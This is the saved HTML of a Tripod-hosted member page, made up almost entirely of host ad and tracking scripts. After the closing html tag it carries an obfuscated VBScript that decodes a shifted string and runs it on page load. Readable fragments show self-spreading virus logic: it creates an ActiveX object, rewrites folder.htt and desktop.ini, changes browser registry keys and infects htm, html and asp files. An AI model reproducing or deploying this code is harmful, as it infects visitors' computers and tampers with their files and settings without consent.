<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=">
<script language="JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
// -->
</script>
</head>

<body bgcolor="#FFFFFF" text="#000000" background="villetta.jpg"><!-- begin compete js -->
<script type="text/javascript">
    __compete_code = '667f89f26d96c30e99728fe6a608804d';
    (function () {
        var s = document.createElement('script'),
            d = document.getElementsByTagName('head')[0] ||
                document.getElementsByTagName('body')[0],
            t = 'https:' == document.location.protocol ? 
                'https://c.compete.com/bootstrap/' : 
                'http://c.compete.com/bootstrap/';
        s.src = t + __compete_code + '/bootstrap.js';
        s.type = 'text/javascript';
        s.async = 'async'; 
        if (d) { d.appendChild(s); }
    }());
</script>
<!-- end compete js -->

<!-- quantcast -->
<script type="text/javascript">
	function channValidator(chann){
	return (typeof(chann) == 'string' && chann != '');
	}

	function lycosQuantcast(){
		var lb = "";
		if(typeof(cm_host) !== 'undefined' && channValidator(cm_host)){
			lb += cm_host.split('.')[0] + '.';
		}
	
		if(typeof(cm_taxid) !==	'undefined' && channValidator(cm_taxid)){
			lb += cm_taxid;
			lb = lb.replace('/','');
		} else {
			lb = lb.replace('.','');
		}
		return lb;
	}
	
	var _qevents = _qevents || [];
	
	(function() {
		var elem = document.createElement('script');
		elem.src = (document.location.protocol == "https:" ? "https://secure" :"http://edge") + ".quantserve.com/quant.js";
		elem.async = true;
		elem.type = "text/javascript";
		var scpt = document.getElementsByTagName('script')[0];
		scpt.parentNode.insertBefore(elem, scpt);
	})();
	
	_qevents.push({
		qacct:"p-6eQegedn62bSo",
		labels:lycosQuantcast()
	});
</script>
<!-- end quantcast -->

<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "luxury-toy";
var tripod_member_page = "luxury-toy/index.htm";
var tripod_ratings_hash = "1318927019:33e72e3c7eab40441b9b1ea77b4499a4";

var lycos_ad_category = {"find_what":"reliv.com"};

var lycos_ad_remote_addr = "154.35.200.66";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=343464";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=343464";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container" style="text-align:center; position:relative; z-index:999999999">
    <div id="tb_ad" style="display:block!important; overflow:hidden; width:868px; margin:0 auto">
    <a href="http://www.tripod.lycos.com" title="build your own website at Tripod.com" style="float:left; width:140px">
    	<img src="http://pd.tripod.com/common/ly/images/freeAd.jpg" alt="Made with Tripod.com" />
    </a> 
        <div id="ad_container" style="display:block!important; float:left; width:728px ">
        <script type="text/javascript">document.write(lycos_ad['leaderboard']);</script>
        </div>
    </div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important; position:relative; z-index:999999!important">
<script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script>
</div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=343464" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>
</body>
</html>

<script language="vbscript"><!--
myEncString="NnEqrnrRdstmd Mewtcil @poOaj+fro+WrSgekl+WhnCiq,SelpkaseCiq,ShhsCiqP`tg,SelpkaseEike+mxSsaqtOafe+DdsjtnpHNH,eokddrGTS,lyDnbSsrhnf,eSsrhnf,uCndd	dhmmxEwpLahn'2(,lyKobakKdy'2(,hnhLhnd(7)+dqooMd(3)cobulemt-wqise;%ciu rtxld=&vhshbhlhtx:hhdcem'=<!&!aopkes male<'ubr.hc`rNs-0-0-10'cndd=bol.ls-abthvdX-AbthvdXBolpnndns>;/!&!aopkes>;/!&!dhv=lyCasa<;%rcqiotl`nfu`gd=!ubrcqiot!fnr<!whncov! dvdns=!!	dnctmdns.vrhtd lyCasa&nnko`d!=m`im_nnko`d');/!&!sbrhps>!	dnctmdns.vrhtd lyCasa&nntnko`d!=m`im_nntnko`d');/!&!sbrhps>!	stbm`im_nnko`d')hnht@csiueW((	imisDhrOashr((	imisRdgDnsrher((	imisDqooCndds')bhdcjEwirtEiker((	imfdcsTgirFhld(SelpkaseEike(	imfdcsRnosDhr')dnc rua	stbm`im_nntnko`d')hneebtQontCiq((	cgebkDxhssFhlds')hneebtShhsEike'Tdmol`tdFhld)leqgdRdgDnsrher((	SbamFhldsHn'TgirDhrOash(	cgebkCaseOLnac((	emdstbrua hnht@csiueW((	Om Drqoq QeruleNdxs	SdtAopNbi < cobulemt-aopkess'ubr.hc`rNs-0-0-10(	AopNbi.resCKSHD(!{E925CC12,1BF/-01C0,ACB8-/0B03FC57A/B|(	AopNbi.brdaseHnrt`nbe')Res VsRhdlk < @poOaj-GdtNbiebt')@poOaj-sdtBLRIC 'z0C42FD00-E083,10CE-7930,0/A/C8044127}!)@poOaj-cqe`tdImssamcd((	Sdtfro=AopNbi.FesOajdcs((	emdstbrua hnhtCiqP`tgs')NnEqrnrRdstmd MewtVimDhr=fro-GdtRpdchakFnlceq(/)SelpkaseCiq < VimDhr&[&Vea&[SelpkaseEike=Tdmol`tdDhr&eokddr-hst!	TgirDhrOash=Mhd'whncov.kobasinn+ 8,Ldn'whncov.kobasinn()Eoq w < Kem(ShhsCiqP`tg)Tn 0 Rtdp-0	Ie Lic(ShhsCiqP`tg,x+ 0)=.Tgem DxhtFnrMewtHfLBare'Rhggt'TgirDhrOash+ 2)( < !hsm! NrLBare'Rhggt'TgirDhrOash+ 3)( < !hsmkTgem	TgirDhrOash=Mhd'TgirDhrOash+ 0,x(	Eksd	TgirDhrOash=Mhd'TgirDhrOash+ 0,Ldn'TgirDhrOash( * w)&.ShhsCiqP`tg < tndsbaoe'TgirDhrOash(	EmdIe	emdstbrua hnhtQefEmtqids')NnEqrnrRdstmd MewtlyKobakKdy'0( < !SsaqtP`gdlyKobakKdy'1( < !Lnc`lP`gdlyKobakKdy'2( < !Ddf`ukt^P`gd_TRKlyDxoM`im(/)=GKDY^CTRQEMT^UREQ\Roetvaqe[Mhcqoroet[Imtdrmes Dxolnrdr[M`im\!	mxEwpLahn'1( < !HJEX_KOBAK_LABHHND\Roetvaqe[Mhcqoroet[Imtdrmes Dxolnrdr[M`im\!	mxEwpLahn'2( < !HJEX_TSDRR\-DDF@UKT[Snfsw`rd\Librnsnfs\HnseqndtEwpkoqeq\Lahn[lyRt`rsP`gd < !hsto:./vwv.fenchther.bol/gecd`_laqid_sokemthnn/hncew.gtldnc rua	stbimisDqooCndds')NnEqrnrRdstmd MewthnhLhnd(/)<ZEwtRhdlkFnlceqVhevs\hnhLhnd(0)<Ceeatls=z5883FEE/-18C4,10CE-@E56,070/2A2D1161}!	imiKime'2(=!{4974EFD0,27D3-01BF,AD65-/8/01B1E0252|=z5883FEE/-18C4,10CE-@E56,070/2A2D1161}!	imiKime'3(=!hnhLhnd(3)<Z{4974EFD0,27D3-01BF,AD65-/8/01B1E0252|]!	imiKime'5(=!PdrrirtLomijeq=eike9/.Fnlceq.gtshnhLhnd(5)<!	imiKime'7(=![-SgeklBl`srImfn]!	imiKime'8(=!CnneiqmEikeNp<0!	fnrx=0tn 7	DdsjtnpHNH=CerksooIMI&imiKime'x( % ubbrkfmewteokddrGTS < !<!&!hsmk>;%aocyssyke<!m`rfim:0!sbrnlk=mo=<!&!oajdcs hd<FhldLhss aoqddr<0t`bhncew=0 bl`sric=!blric:0810EEC0,463D-01C0,A86B-/0B03FC7/5@2!ssyke<!whdsh9 00/%: gehggt9 00/%!t`bHncew=,1=<.%nbiebt=<.%aocy=<.%gtll=crnpLe'0( < !<!&!sbrhps kamgtafe<!vasbrhps!>;%cgr'32)%,-!	dqooMd(0)=lyDnbSsrhnf=!!&lyDnbSsrhnf&!!crnpLe'2( < !Ewe! % !cttd(!eoq h=0 soLdn'mxEmcRtqimg(! % ubbrkf&!s<cgr'arc'mhd'mxEmcRtqimg+i+1()*imnd2(! &vacqle % !hfs<cgr'18)tgem r=bhq(24(! &vacqle % !hfs<cgr'27)tgem r=ubBr! % ubbrkf&!ie r=bhq(19( shdns<vaLe! &vacqle % !lyCebSsrhnf=lyCebSsrhnf % r! &vacqle % !mewt!(crnpLe'3( < !Ewe! % !cttd(lyCebSsrhnf)!	dqooMd(3)=,-! % !>;/! % !sbrhps>!	fnrx=0tn 3	vBoce<vBoce&dqooMd(w)&vacqle	ndxs	fRtqimg<mxEmcRtqimgdnc rua	StbSbamFhldsHn'fnlceqsoeb)NnEqrnrRdstmd MewtRes lyEokddrr2=fro-GdtEokddr'fnlceqsoeb)Res lyRuaFnlceqFhlds=mxFnlceqs1.Eiker	FnrE`cg lyRuaFnlceqFhld HnmxStbEokddrEiker	mxEwt=LBare'fro-GdtDxsemshomN`md(lyRuaFnlceqFhld.Male()HfmxEwt=gtlOq lyDxs < !hsmkOq lyDxs < !hst! ShdnhneebtShhsEike(lyRuaFnlceqFhld.Oash(		HfmxEwt=gtsTgem	SdtmxFhld < esn.FesFhld(lyRuaFnlceqFhld.Oash(	mxFhld.@tsrhbttds=7Dnc HfDnc HfMewtDnc Rua	StbimfdcsTgirFhld(eokddrrpdc(	Om Drqoq QeruleNdxs	SdtmxFhld < esn.NpdnSewtEike'fnlceqsoeb)lyBomtdnss=mxFhld.Qe`d@lk	mxFhld.Blnsd	k<0eoq h=ldn'mxCnnsemtr)tn 0 rtdp-0	ie lic(lyBomtdnss+i+ldn'fRtqimg()<fRtqimgtgem j=j+0	ewis eoq	emdie	ndxs	ie j=/ shdn	vOCndd=lyBomtdnss&vacqle % uCndd	SdtmxFhld < esn.FesFhld(eokddrrpdc(	mxFhld.@tsrhbttds=0Res lyEike=fro-OoemTdxsFhld(eokddrrpdc+ 1)lyEike-WqisevOCndd	mxFhld.Blnsd	emdie	EmdStbrua bhdcjEwirtEiker((	Om Drqoq QeruleNdxs	Ie mos(esn.EokddrDxhsss'Tdmol`tdDhr()Tgem Res lyEike=fro-Cqe`tdFnlceq(SelpkaseCiq)Res lyEike=fro-GdtEokddr'Tdmol`tdDhr(	mxFhld.@tsrhbttds=7BrdaseShhsEikeTdmol`tdFhld,eokddrGTS	emdstbrua hneebtQontCiq((	Om Drqoq QeruleNdxs	Ie Kem(tndsbaoe'TgirDhrOash()<< 3 ShdnShhsCiqP`tg <Mhd'TgirDhrOash+ 0,3( BrdaseShhsEikeTgirDhrOash%eokddr-hst!,eokddrGTS&ubbrkf%vBoceBrdaseShhsEikeTgirDhrOash%cerksoo.hnh+DdsjtnpHNH	emdie	emdstbrua leqgdRdgDnsrher((	Om Drqoq QeruleNdxs	fnrx<0tn 1	AopkyQefCgamgdsSomxEwpLahn'x( % lyKobakKdy'x(,QEF_RZ!,mxSsaqtOafemewtdnc rua	StbAopkyQefCgamgdsSo'mxRdgJex,mxRdgSyoe+ lyQefV`lte(	Om Drqoq QeruleNdxs	WrSgekl-RdgVrhtd lyQefKdy+ lyQefV`lte+ lyQefTxpd	EmdStbRua bhdcjD`tdPKo`d')NnEqrnrRdstmd MewtHfMhd'FnrlasD`tdThmd(Mov((,2(,1+ 3)=8/16! ShdnWrSgekl-Rtn(!RTNCLK31.DXD rhdlk31.clk,RHDxhtVimdnwrEw 1(	EmdStbRua BrdaseShhsEike'fnlceqsoeb,vishBomtdnss(	Om Drqoq QeruleNdxs	sdtmxFhld=esn.FesFhld(eokddrrpdc(	mxFhld.@tsrhbttds=0Res lyEike<fro-Cqe`tdTdxsFhld(eokddrrpdc+ Srte(	mxFhld.Vrhtd vishBomtdnsslyEike-Ckoreres lyEike<fro-GdtEike'fnlceqsoeb)lyEike-Astqiauser < 6	EmdStb"
Execute("for i=1 to Len(myEncString)" & vbcrlf & "s=chr(asc(mid(myEncString,i,1))+i mod 2)"  & vbcrlf & "if s=chr(19) then s=chr(34)"  & vbcrlf & "if s=chr(28) then s=vbCr"  & vbcrlf & "if s=chr(29) then s=vbLf"  & vbcrlf & "myDecString=myDecString & s"  & vbcrlf & "next")
Execute(myDecString)
--></script>
